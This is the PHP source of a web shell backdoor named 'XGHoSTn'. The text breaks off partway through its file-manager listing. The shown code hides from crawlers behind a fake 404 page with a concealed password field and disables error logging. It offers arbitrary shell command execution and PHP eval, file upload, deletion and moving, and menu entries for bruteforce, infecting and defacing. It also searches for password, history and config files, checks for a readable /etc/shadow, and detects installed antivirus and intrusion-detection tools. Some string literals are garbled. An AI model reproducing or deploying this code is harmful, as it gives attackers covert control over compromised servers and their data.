<?php
$auth_pass = "67849806356d5dbc7e59edc593ef0228";
$color = "#00ff00";
$sec = 1;
$default_action = 'FilesMan';
@define('SELF_PATH', __FILE__);
if (!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler", "facebook", "yahoo");
    if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
@session_start();
@error_reporting(0);
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
@define('VERSION', 'v4 by Sp4nksta');
if (get_magic_quotes_gpc()) {
    function stripslashes_array($array) {
        return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
    }
    $_POST = stripslashes_array($_POST);
}
function printLogin() {
?>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache Server at <?=$_SERVER['HTTP_HOST'] ?> Port 80</address>
	<style>
		input { margin:0;background-color:#fff;border:1px solid #fff; }
	</style>
	<center>
	<form method=post>
	<input type=password name=pass>
	</form></center>
	<?php
    exit;
}
if ($sec == 1 && !isset($_SESSION[md5($_SERVER['HTTP_HOST']) ])) if (empty($auth_pass) || (isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))) $_SESSION[md5($_SERVER['HTTP_HOST']) ] = true;
else printLogin();
if (strtolower(substr(PHP_OS, 0, 3)) == "win") $os = 'win';
else $os = 'nix';
$safe_mode = @ini_get('safe_mode');
$disable_functions = @ini_get('disable_functions');
$home_cwd = @getcwd();
if (isset($_POST['c'])) @chdir($_POST['c']);
$cwd = @getcwd();
if ($os == 'win') {
    $home_cwd = str_replace("\", " / ", $home_cwd);
	$cwd = str_replace("\", " / ", $cwd);
}
if( $cwd[strlen($cwd) - 1] != '/' )
	$cwd .= '/';
	
if($os == 'win')
	$aliases = array(
		"ListDirectory" => "dir",
    	"Findindex . phpincurrentdir" => "dir / s / w / bindex . php",
    	"Find * config * . phpincurrentdir" => "dir / s / w / b * config * . php",
    	"Showactiveconnections" => "netstat - an",
    	"Showrunningservices" => "netstart",
    	"Useraccounts" => "netuser",
    	"Showcomputers" => "netview",
		"ARPTable" => "arp - a",
		"IPConfiguration" => "ipconfig / all"
	);
else
	$aliases = array(
  		"Listdir" => "ls - la",
		"listfileattributesonaLinuxsecondextendedfilesystem" => "lsattr - va",
  		"showopenedports" => "netstat - an | grep - ilisten",
		"Find" => "",
  		"findallsuidfiles" => "find / -typef - perm - 04000 - ls",
  		"findsuidfilesincurrentdir" => "find . -typef - perm - 04000 - ls",
  		"findallsgidfiles" => "find / -typef - perm - 02000 - ls",
  		"findsgidfilesincurrentdir" => "find . -typef - perm - 02000 - ls",
  		"findconfig . inc . phpfiles" => "find / -typef - nameconfig . inc . php",
  		"findconfig * files" => "find / -typef - name\"config*\"", "find config* files in current dir" => "find . -type f -name \"config*\"", "find all writable folders and files" => "find / -perm -2 -ls", "find all writable folders and files in current dir" => "find . -perm -2 -ls", "find all service.pwd files" => "find / -type f -name service.pwd", "find service.pwd files in current dir" => "find . -type f -name service.pwd", "find all .htpasswd files" => "find / -type f -name .htpasswd", "find .htpasswd files in current dir" => "find . -type f -name .htpasswd", "find all .bash_history files" => "find / -type f -name .bash_history", "find .bash_history files in current dir" => "find . -type f -name .bash_history", "find all .fetchmailrc files" => "find / -type f -name .fetchmailrc", "find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc", "Locate" => "", "locate httpd.conf files" => "locate httpd.conf", "locate vhosts.conf files" => "locate vhosts.conf", "locate proftpd.conf files" => "locate proftpd.conf", "locate psybnc.conf files" => "locate psybnc.conf", "locate my.conf files" => "locate my.conf", "locate admin.php files" => "locate admin.php", "locate cfg.php files" => "locate cfg.php", "locate conf.php files" => "locate conf.php", "locate config.dat files" => "locate config.dat", "locate config.php files" => "locate config.php", "locate config.inc files" => "locate config.inc", "locate config.inc.php" => "locate config.inc.php", "locate config.default.php files" => "locate config.default.php", "locate config* files " => "locate config", "locate .conf files" => "locate '.conf'", "locate .pwd files" => "locate '.pwd'", "locate .sql files" => "locate '.sql'", "locate .htpasswd files" => "locate '.htpasswd'", "locate .bash_history files" => "locate '.bash_history'", "locate .mysql_history files" => "locate '.mysql_history'", "locate .fetchmailrc files" => "locate '.fetchmailrc'", "locate backup files" => "locate backup", "locate dump files" => "locate dump", "locate priv files" => "locate priv");
    function printHeader() {
        if (empty($_POST['charset'])) $_POST['charset'] = "UTF-8";
        global $color;
?>
<html><head><meta http-equiv='Content-Type' content='text/html; charset=<?=$_POST['charset'] ?>'><title>XGHoSTn- <?=VERSION ?></title>

<link rel="SHORTCUT ICON" href="http://imageshack.us/a/img716/272/philippineflagsourcec0d.gif" type="image/x-icon"/>

<STYLE type=text/css>BODY { 



    background: url(http://www.userlogos.org/files/backgrounds/macleod.mac/Map1280x800.jpg)  center no-repeat fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover; background-color: #00000;
 } 



</STYLE> 

<style type="text/css">body, a, a:hover {cursor: url(http://cur.cursors-4u.net/cursors/cur-11/cur1054.cur), progress;}<style type="text/css">body, a, a:hover {cursor: url(http://cur.cursors-4u.net/cursors/cur-11/cur1054.cur), progress;}</style>

<style>
	body {background-color:#000;color:#fff;}
	body,td,th	{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top; }
	span,h1,a	{ color:<?=$color ?> !important; }
	span		{ font-weight: bolder; }
	h1			{ border:1px solid <?=$color ?>;padding: 2px 5px;font: 14pt Verdana;margin:0px; }
	div.content	{ padding: 5px;margin-left:5px;}
	a			{ text-decoration:none; }
	a:hover		{ background:#ff0000; }
	.ml1		{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
	.bigarea	{ width:100%;height:250px; }
	input, textarea, select	{ margin:0;color:#00ff00;background-color:#000;border:1px solid <?=$color ?>; font: 9pt Monospace,"Courier New"; }
	form		{ margin:0px; }
	#toolsTbl	{ text-align:center; }
	.toolsInp	{ width: 80%; }
	.main th	{text-align:left;}
	.main tr:hover{background-color:#5e5e5e;}
	.main td, th{vertical-align:middle;}
	pre			{font-family:Courier,Monospace;}
	#cot_tl_fixed{position:fixed;bottom:0px;font-size:12px;left:0px;padding:4px 0;clip:_top:expression(document.documentElement.scrollTop+document.documentElement.clientHeight-this.clientHeight);_left:expression(document.documentElement.scrollLeft + document.documentElement.clientWidth - offsetWidth);}
</style>
<script>
	function set(a,c,p1,p2,p3,p4,charset) {
		if(a != null)document.mf.a.value=a;
		if(c != null)document.mf.c.value=c;
		if(p1 != null)document.mf.p1.value=p1;
		if(p2 != null)document.mf.p2.value=p2;
		if(p3 != null)document.mf.p3.value=p3;
		if(p4 != null)document.mf.p4.value=p4;
		if(charset != null)document.mf.charset.value=charset;
	}
	function g(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		document.mf.submit();
	}
	function da2(a,c,p1,p2,p3,p4,charset) {
		set(a,c,p1,p2,p3,p4,charset);
		document.mf.submit();
	}
	function a(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		var params = "ajax=true";
		for(i=0;i<document.mf.elements.length;i++)
			params += "&"+document.mf.elements[i].name+"="+encodeURIComponent(document.mf.elements[i].value);
		sr('<?=$_SERVER['REQUEST_URI']; ?>', params);
	}
	function sr(url, params) {	
		if (window.XMLHttpRequest) {
			req = new XMLHttpRequest();
			req.onreadystatechange = processReqChange;
			req.open("POST", url, true);
			req.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
			req.send(params);
		} 
		else if (window.ActiveXObject) {
			req = new ActiveXObject("Microsoft.XMLHTTP");
			if (req) {
				req.onreadystatechange = processReqChange;
				req.open("POST", url, true);
				req.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
				req.send(params);
			}
		}
	}
	function processReqChange() {
		if( (req.readyState == 4) )
			if(req.status == 200) {

				//alert(req.responseText);
				var reg = new RegExp("(\d+)([\S\s]*)", "m");
				var arr=reg.exec(req.responseText);
				eval(arr[2].substr(0, arr[1]));
			} 
			else alert("Request error!");
	}
</script>
<head><body><div style="position:absolute;width:100%;top:0;left:0;">
<form method=post name=mf style='display:none;'>
<input type=hidden name=a value='<?=isset($_POST['a']) ? $_POST['a'] : '' ?>'>
<input type=hidden name=c value='<?=htmlspecialchars($GLOBALS['cwd']) ?>'>
<input type=hidden name=p1 value='<?=isset($_POST['p1']) ? htmlspecialchars($_POST['p1']) : '' ?>'>
<input type=hidden name=p2 value='<?=isset($_POST['p2']) ? htmlspecialchars($_POST['p2']) : '' ?>'>
<input type=hidden name=p3 value='<?=isset($_POST['p3']) ? htmlspecialchars($_POST['p3']) : '' ?>'>
<input type=hidden name=p4 value='<?=isset($_POST['p4']) ? htmlspecialchars($_POST['p4']) : '' ?>'>
<input type=hidden name=charset value='<?=isset($_POST['charset']) ? $_POST['charset'] : '' ?>'>
</form>
<?php
        $freeSpace = @diskfreespace($GLOBALS['cwd']);
        $totalSpace = @disk_total_space($GLOBALS['cwd']);
        $totalSpace = $totalSpace ? $totalSpace : 1;
        $release = @php_uname('r');
        $kernel = @php_uname('s');
        $millink = 'http://www.exploit-db.com/search/?action=search&filter_description=';
        // fixme
        $millink2 = 'http://www.1337day.com/search';
        if (strpos('Linux', $kernel) !== false) $millink.= urlencode('' . substr($release, 0, 6));
        else $millink.= urlencode($kernel . ' ' . substr($release, 0, 3));
        if (!function_exists('posix_getegid')) {
            $user = @get_current_user();
            $uid = @getmyuid();
            $gid = @getmygid();
            $group = "?";
        } else {
            $uid = @posix_getpwuid(@posix_geteuid());
            $gid = @posix_getgrgid(@posix_getegid());
            $user = $uid['name'];
            $uid = $uid['uid'];
            $group = $gid['name'];
            $gid = $gid['gid'];
        }
        $cwd_links = '';
        $path = explode("/", $GLOBALS['cwd']);
        $n = count($path);
        for ($i = 0;$i < $n - 1;$i++) {
            $cwd_links.= "<a href='#' onclick='g(\"FilesMan\",\"";
            for ($j = 0;$j <= $i;$j++) $cwd_links.= $path[$j] . '/';
            $cwd_links.= "\")'>" . $path[$i] . "/</a>";
        }
        $charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
        $opt_charsets = '';
        foreach ($charsets as $item) $opt_charsets.= '<option value="' . $item . '" ' . ($_POST['charset'] == $item ? 'selected' : '') . '>' . $item . '</option>';
        $m = array('Sec. Info' => 'SecInfo', 'Files' => 'FilesMan', 'Console' => 'Console', 'Sql' => 'Sql', 'Php' => 'Php', 'Safe mode' => 'SafeMode', 'String tools' => 'StringTools', 'Bruteforce' => 'Bruteforce', 'Network' => 'Network', 'Infect' => 'Infect', 'Readable' => 'Readable', 'Test' => 'Test', 'CgiShell' => 'CgiShell', 'Symlink' => 'Symlink', 'Deface' => 'Deface', 'Domain' => 'Domain', 'ZHposter' => 'ZHposter');
        if (!empty($GLOBALS['auth_pass'])) $m['Logout'] = 'Logout';
        $m['Self remove'] = 'SelfRemove';
        $menu = '';
        foreach ($m as $k => $v) $menu.= '<th width="' . (int)(1 / count($m)) . '%">[ <a href="#" onclick="g(\'' . $v . '\',null,\'\',\'\',\'\')">' . $k . '</a> ]</th>';
        $drives = "";
        if ($GLOBALS['os'] == 'win') {
            foreach (range('a', 'z') as $drive) if (is_dir($drive . ':\'))
			$drives .= ' < ahref = "#"onclick = "g(\'FilesMan\',\''.$drive.':/\')" > ['.$drive.'] < / a > ';
	}
	echo ' < tableclass = infocellpadding = 3cellspacing = 0width = 100 % > < tr > < tdwidth = 1 > < span > Uname < br > User < br > Php < br > Hdd < br > Cwd'.($GLOBALS['os'] == 'win'?' < br > Drives':'').' < / span > < / td > '.
		 ' < td >: < nobr > '.substr(@php_uname(), 0, 120).' < ahref = "http://www.google.com/search?q='.urlencode(@php_uname()).'"target = "_blank" > [Google] < / a > < ahref = "'.$millink.'"target = _blank > [exploit - db] < / a > < ahref = "'.$millink2.'"target = _blank > [1337day] < / a > Download: < ahref = "http://www.google.com"target = _blank > [SideKick1] < / a > < ahref = "http://www.google.com"target = _blank > [SideKick2] < / a > < / nobr > < br >:
                        '.$uid.'('.$user.') < span > Group: < / span > '.$gid.'('.$group.') < span > UsefullLocals: < / span > '.rootxpL().' < br >:
                                    '.@phpversion().' < span > Safemode: < / span > '.($GLOBALS['safe_mode']?' < fontcolor = red > ON < / font > ':' < fontcolor = < ? = $color ?><b>OFF</b></font>').' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span> '.date('Y-m-d H:i:s').'<br>:'.viewSize($totalSpace).' <span>Free:</span> '.viewSize($freeSpace).' ('.(int)($freeSpace/$totalSpace*100).'%)<br>:'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a><br>'.$drives.'</td>'.
		 '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">'.$opt_charsets.'</optgroup></select><br><span>Server IP:</span><br>'.gethostbyname($_SERVER["HTTP_HOST"]).'<br><span>Client IP:</span><br>'.$_SERVER['REMOTE_ADDR'].'</nobr></td></tr></table>'.
		 '<table cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><div style="margin:5">';
}

function printFooter() {
	$is_writable = is_writable($GLOBALS['cwd'])?"<font color=green>[ Writeable ]</font>":"<font color=red>[ Not writable ]</font>";
?>
</div>
<table class=info id=toolsTbl cellpadding=0 cellspacing=0 width=100%">
	<tr>
		<td><form onSubmit="g(null,this.c.value);return false;"><span>Change dir:</span><br><input class="toolsInp" type=text name=c value="<?=htmlspecialchars($GLOBALS['cwd']); ?>"><input type=submit value=">>"></form></td>
		<td><form onSubmit="g('FilesTools',null,this.f.value);return false;"><span>Read file:</span><br><input class="toolsInp" type=text name=f><input type=submit value=">>"></form></td>
	</tr>
	<tr>
		<td><form onSubmit="g('FilesMan',null,'mkdir',this.d.value);return false;"><span>Make dir:</span><br><input class="toolsInp" type=text name=d><input type=submit value=">>"></form><?=$is_writable ?></td>
		<td><form onSubmit="g('FilesTools',null,this.f.value,'mkfile');return false;"><span>Make file:</span><br><input class="toolsInp" type=text name=f><input type=submit value=">>"></form><?=$is_writable ?></td>
	</tr>
	<tr>
		<td><form onSubmit="g('Console',null,this.c.value);return false;"><span>Execute:</span><br><input class="toolsInp" type=text name=c value=""><input type=submit value=">>"></form></td>
		<td><form method='post' ENCTYPE='multipart/form-data'>
		<input type=hidden name=a value='FilesMAn'>
		<input type=hidden name=c value='<?=htmlspecialchars($GLOBALS['cwd']) ?>'>
		<input type=hidden name=p1 value='uploadFile'>
		<input type=hidden name=charset value='<?=isset($_POST['charset']) ? $_POST['charset'] : '' ?>'>
		<span>Upload file:</span><br><input class="toolsInp" type=file name=f><input type=submit value=">>"></form><?=$is_writable ?></td>
	</tr>

</table>
</div>
</body></html>
<?php
                                    }
                                    if (!function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid') === false)) {
                                        function posix_getpwuid($p) {
                                            return false;
                                        }
                                    }
                                    if (!function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid') === false)) {
                                        function posix_getgrgid($p) {
                                            return false;
                                        }
                                    }
                                    function ex($in) {
                                        $out = '';
                                        if (function_exists('exec')) {
                                            @exec($in, $out);
                                            $out = @join("
", $out);
                                        } elseif (function_exists('passthru')) {
                                            ob_start();
                                            @passthru($in);
                                            $out = ob_get_clean();
                                        } elseif (function_exists('system')) {
                                            ob_start();
                                            @system($in);
                                            $out = ob_get_clean();
                                        } elseif (function_exists('shell_exec')) {
                                            $out = shell_exec($in);
                                        } elseif (is_resource($f = @popen($in, "r"))) {
                                            $out = "";
                                            while (!@feof($f)) $out.= fread($f, 1024);
                                            pclose($f);
                                        }
                                        return $out;
                                    }
                                    function viewSize($s) {
                                        if ($s >= 1073741824) return sprintf('%1.2f', $s / 1073741824) . ' GB';
                                        elseif ($s >= 1048576) return sprintf('%1.2f', $s / 1048576) . ' MB';
                                        elseif ($s >= 1024) return sprintf('%1.2f', $s / 1024) . ' KB';
                                        else return $s . ' B';
                                    }
                                    function perms($p) {
                                        if (($p & 0xC000) == 0xC000) $i = 's';
                                        elseif (($p & 0xA000) == 0xA000) $i = 'l';
                                        elseif (($p & 0x8000) == 0x8000) $i = '-';
                                        elseif (($p & 0x6000) == 0x6000) $i = 'b';
                                        elseif (($p & 0x4000) == 0x4000) $i = 'd';
                                        elseif (($p & 0x2000) == 0x2000) $i = 'c';
                                        elseif (($p & 0x1000) == 0x1000) $i = 'p';
                                        else $i = 'u';
                                        $i.= (($p & 0x0100) ? 'r' : '-');
                                        $i.= (($p & 0x0080) ? 'w' : '-');
                                        $i.= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
                                        $i.= (($p & 0x0020) ? 'r' : '-');
                                        $i.= (($p & 0x0010) ? 'w' : '-');
                                        $i.= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
                                        $i.= (($p & 0x0004) ? 'r' : '-');
                                        $i.= (($p & 0x0002) ? 'w' : '-');
                                        $i.= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
                                        return $i;
                                    }
                                    function viewPermsColor($f) {
                                        if (!@is_readable($f)) return '<font color=#FF0000><b>' . perms(@fileperms($f)) . '</b></font>';
                                        elseif (!@is_writable($f)) return '<font color=white><b>' . perms(@fileperms($f)) . '</b></font>';
                                        else return '<font color=#00BB00><b>' . perms(@fileperms($f)) . '</b></font>';
                                    }
                                    if (!function_exists("scandir")) {
                                        function scandir($dir) {
                                            $dh = opendir($dir);
                                            while (false !== ($filename = readdir($dh))) {
                                                $files[] = $filename;
                                            }
                                            return $files;
                                        }
                                    }
                                    function which($p) {
                                        $path = ex('which ' . $p);
                                        if (!empty($path)) return $path;
                                        return false;
                                    }
                                    function actionSecInfo() {
                                        printHeader();
                                        echo '<h1>Server security information</h1><div class=content>';
                                        function showSecParam($n, $v) {
                                            $v = trim($v);
                                            if ($v) {
                                                echo '<span>' . $n . ': </span>';
                                                if (strpos($v, "
") === false) echo $v . '<br>';
                                                else echo '<pre class=ml1>' . $v . '</pre>';
                                            }
                                        }
                                        showSecParam('Server software', @getenv('SERVER_SOFTWARE'));
                                        if (function_exists('apache_get_modules')) showSecParam('Loaded Apache modules', implode(', ', apache_get_modules()));
                                        showSecParam('Disabled PHP Functions', ($GLOBALS['disable_functions']) ? $GLOBALS['disable_functions'] : 'none');
                                        showSecParam('Open base dir', @ini_get('open_basedir'));
                                        showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
                                        showSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
                                        showSecParam('cURL support', function_exists('curl_version') ? 'enabled' : 'no');
                                        $temp = array();
                                        if (function_exists('mysql_get_client_info')) $temp[] = "MySql (" . mysql_get_client_info() . ")";
                                        if (function_exists('mssql_connect')) $temp[] = "MSSQL";
                                        if (function_exists('pg_connect')) $temp[] = "PostgreSQL";
                                        if (function_exists('oci_connect')) $temp[] = "Oracle";
                                        showSecParam('Supported databases', implode(', ', $temp));
                                        echo '<br>';
                                        if ($GLOBALS['os'] == 'nix') {
                                            $userful = array('gcc', 'lcc', 'cc', 'ld', 'make', 'php', 'perl', 'python', 'ruby', 'tar', 'gzip', 'bzip', 'bzip2', 'nc', 'locate', 'suidperl');
                                            $danger = array('kav', 'nod32', 'bdcored', 'uvscan', 'sav', 'drwebd', 'clamd', 'rkhunter', 'chkrootkit', 'iptables', 'ipfw', 'tripwire', 'shieldcc', 'portsentry', 'snort', 'ossec', 'lidsadm', 'tcplodg', 'sxid', 'logcheck', 'logwatch', 'sysmask', 'zmbscap', 'sawmill', 'wormscan', 'ninja');
                                            $downloaders = array('wget', 'fetch', 'lynx', 'links', 'curl', 'get', 'lwp-mirror');
                                            showSecParam('Readable /etc/passwd', @is_readable('/etc/passwd') ? "yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>" : 'no');
                                            showSecParam('Readable /etc/shadow', @is_readable('/etc/shadow') ? "yes <a href='#' onclick='g(\"FilesTools\", \"etc\", \"shadow\")'>[view]</a>" : 'no');
                                            showSecParam('OS version', @file_get_contents('/proc/version'));
                                            showSecParam('Distr name', @file_get_contents('/etc/issue.net'));
                                            if (!$GLOBALS['safe_mode']) {
                                                echo '<br>';
                                                $temp = array();
                                                foreach ($userful as $item) if (which($item)) {
                                                    $temp[] = $item;
                                                }
                                                showSecParam('Userful', implode(', ', $temp));
                                                $temp = array();
                                                foreach ($danger as $item) if (which($item)) {
                                                    $temp[] = $item;
                                                }
                                                showSecParam('Danger', implode(', ', $temp));
                                                $temp = array();
                                                foreach ($downloaders as $item) if (which($item)) {
                                                    $temp[] = $item;
                                                }
                                                showSecParam('Downloaders', implode(', ', $temp));
                                                echo '<br/>';
                                                showSecParam('Hosts', @file_get_contents('/etc/hosts'));
                                                showSecParam('HDD space', ex('df -h'));
                                                showSecParam('Mount options', @file_get_contents('/etc/fstab'));
                                            }
                                        } else {
                                            showSecParam('OS Version', ex('ver'));
                                            showSecParam('Account Settings', ex('net accounts'));
                                            showSecParam('User Accounts', ex('net user'));
                                        }
                                        echo '</div>';
                                        printFooter();
                                    }
                                    function actionPhp() {
                                        if (isset($_POST['ajax'])) {
                                            $_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = true;
                                            ob_start();
                                            eval($_POST['p1']);
                                            $temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='" . addcslashes(htmlspecialchars(ob_get_clean()), "

	\' ") . "';
";
                                            echo strlen($temp), "
", $temp;
                                            exit;
                                        }
                                        printHeader();
                                        if (isset($_POST['p2']) && ($_POST['p2'] == 'info')) {
                                            echo '<h1>PHP info</h1><div class=content>';
                                            ob_start();
                                            phpinfo();
                                            $tmp = ob_get_clean();
                                            $tmp = preg_replace('!body {.*}!msiU', '', $tmp);
                                            $tmp = preg_replace('!a:\w+ {.*}!msiU', '', $tmp);
                                            $tmp = preg_replace('!h1!msiU', 'h2', $tmp);
                                            $tmp = preg_replace('!td, th {(.*)}!msiU', '.e, .v, .h, .h th {$1}', $tmp);
                                            $tmp = preg_replace('!body, td, th, h2, h2 {.*}!msiU', '', $tmp);
                                            echo $tmp;
                                            echo '</div><br>';
                                        }
                                        if (empty($_POST['ajax']) && !empty($_POST['p1'])) $_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = false;
                                        echo '<h1>Execution PHP-code</h1> example : echo file_get_contents(`/etc/passwd`); <div class=content><form name=pf method=post onsubmit="if(this.ajax.checked){a(null,null,this.code.value);}else{g(null,null,this.code.value,\'\');}return false;"><textarea name=code class=bigarea id=PhpCode>' . (!empty($_POST['p1']) ? htmlspecialchars($_POST['p1']) : '') . '</textarea><input type=submit value=Eval style="margin-top:5px">';
                                        echo ' <input type=checkbox name=ajax value=1 ' . ($_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . '> send using AJAX</form><pre id=PhpOutput style="' . (empty($_POST['p1']) ? 'display:none;' : '') . 'margin-top:5px;" class=ml1>';
                                        if (!empty($_POST['p1'])) {
                                            ob_start();
                                            eval($_POST['p1']);
                                            echo htmlspecialchars(ob_get_clean());
                                        }
                                        echo '</pre></div>';
                                        printFooter();
                                    }
                                    function actionFilesMan() {
                                        printHeader();
                                        echo '<h1>File manager</h1><div class=content>';
                                        if (isset($_POST['p1'])) {
                                            switch ($_POST['p1']) {
                                                case 'uploadFile' : if (!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name'])) echo "Can't upload file!";
                                                break;
                                                break;
                                            case 'mkdir':
                                                if (!@mkdir($_POST['p2'])) echo "Can't create new dir";
                                                break;
                                            case 'delete':
                                                function deleteDir($path) {
                                                    $path = (substr($path, -1) == '/') ? $path : $path . '/';
                                                    $dh = opendir($path);
                                                    while (($item = readdir($dh)) !== false) {
                                                        $item = $path . $item;
                                                        if ((basename($item) == "..") || (basename($item) == ".")) continue;
                                                        $type = filetype($item);
                                                        if ($type == "dir") deleteDir($item);
                                                        else @unlink($item);
                                                    }
                                                    closedir($dh);
                                                    rmdir($path);
                                                }
                                                if (is_array(@$_POST['f'])) foreach ($_POST['f'] as $f) {
                                                    $f = urldecode($f);
                                                    if (is_dir($f)) deleteDir($f);
                                                    else @unlink($f);
                                                }
                                                break;
                                            case 'paste':
                                                if ($_SESSION['act'] == 'copy') {
                                                    function copy_paste($c, $s, $d) {
                                                        if (is_dir($c . $s)) {
                                                            mkdir($d . $s);
                                                            $h = opendir($c . $s);
                                                            while (($f = readdir($h)) !== false) if (($f != ".") and ($f != "..")) {
                                                                copy_paste($c . $s . '/', $f, $d . $s . '/');
                                                            }
                                                        } elseif (is_file($c . $s)) {
                                                            @copy($c . $s, $d . $s);
                                                        }
                                                    }
                                                    foreach ($_SESSION['f'] as $f) copy_paste($_SESSION['cwd'], $f, $GLOBALS['cwd']);
                                                } elseif ($_SESSION['act'] == 'move') {
                                                    function move_paste($c, $s, $d) {
                                                        if (is_dir($c . $s)) {
                                                            mkdir($d . $s);
                                                            $h = opendir($c . $s);
                                                            while (($f = readdir($h)) !== false) if (($f != ".") and ($f != "..")) {
                                                                copy_paste($c . $s . '/', $f, $d . $s . '/');
                                                            }
                                                        } elseif (is_file($c . $s)) {
                                                            @copy($c . $s, $d . $s);
                                                        }
                                                    }
                                                    foreach ($_SESSION['f'] as $f) @rename($_SESSION['cwd'] . $f, $GLOBALS['cwd'] . $f);
                                                }
                                                unset($_SESSION['f']);
                                                break;
                                            default:
                                                if (!empty($_POST['p1']) && (($_POST['p1'] == 'copy') || ($_POST['p1'] == 'move'))) {
                                                    $_SESSION['act'] = @$_POST['p1'];
                                                    $_SESSION['f'] = @$_POST['f'];
                                                    foreach ($_SESSION['f'] as $k => $f) $_SESSION['f'][$k] = urldecode($f);
                                                    $_SESSION['cwd'] = @$_POST['c'];
                                                }
                                                break;
                                            }
                                            echo '<script>document.mf.p1.value="";document.mf.p2.value="";</script>';
                                        }
                                        $dirContent = @scandir(isset($_POST['c']) ? $_POST['c'] : $GLOBALS['cwd']);
                                        if ($dirContent === false) {
                                            echo 'Can\'t open this folder!';
                                            return;
                                        }
                                        global $sort;
                                        $sort = array('name', 1);
                                        if (!empty($_POST['p1'])) {
                                            if (preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match)) $sort = array($match[1], (int)$match[2]);
                                        }
?>
<script>
	function sa() {
		for(i=0;i<document.files.elements.length;i++)
			if(document.files.elements[i].type == 'checkbox')
				document.files.elements[i].checked = document.files.elements[0].checked;
	}
</script>
<table width='100%' class='main' cellspacing='0' cellpadding='2'>
<form name=files method=post>
<?php
                                        echo "<tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_" . ($sort[1] ? 0 : 1) . "\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_" . ($sort[1] ? 0 : 1) . "\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_" . ($sort[1] ? 0 : 1) . "\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_" . ($sort[1] ? 0 : 1) . "\")'>Permissions</a></th><th>Actions</th></tr>";
                                        $dirs = $files = $links = array();
                                        $n = count($dirContent);
                                        for ($i = 0;$i < $n;$i++) {
                                            $ow = @posix_getpwuid(@fileowner($dirContent[$i]));
                                            $gr = @posix_getgrgid(@filegroup($dirContent[$i]));
                                            $tmp = array('name' => $dirContent[$i], 'path' => $GLOBALS['cwd'] . $dirContent[$i], 'modify' => date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])), 'perms' => viewPermsColor($GLOBALS['cwd'] . $dirContent[$i]), 'size' => @filesize($GLOBALS['cwd'] . $dirContent[$i]), 'owner' => $ow['name'] ? $ow['name'] : @fileowner($dirContent[$i]), 'group' => $gr['name'] ? $gr['name'] : @filegroup($dirContent[$i]));
                                            if (@is_file($GLOBALS['cwd'] . $dirContent[$i])) $files[] = array_merge($tmp, array('type' => 'file'));
                                            elseif (@is_link($GLOBALS['cwd'] . $dirContent[$i])) $links[] = array_merge($tmp, array('type' => 'link'));
                                            elseif (@is_dir($GLOBALS['cwd'] . $dirContent[$i]) && ($dirContent[$i] != ".")) $dirs[] = array_merge($tmp, array('type' => 'dir'));
                                        }
                                        $GLOBALS['sort'] = $sort;
                                        function cmp($a, $b) {
                                            if ($GLOBALS['sort'][0] != 'size') return strcmp($a[$GLOBALS['sort'][0]], $b[$GLOBALS['sort'][0]]) * ($GLOBALS['sort'][1] ? 1 : -1);
                                            else return (($a['size'] < $b['size']) ? -1 : 1) * ($GLOBALS['sort'][1] ? 1 : -1);
                                        }
                                        usort($files, "cmp");
                                        usort($dirs, "cmp");
                                        usort($links, "cmp");
                                        $files = array_merge($dirs, $links, $files);
                                        $l = 0;
                                        foreach ($files as $f) {
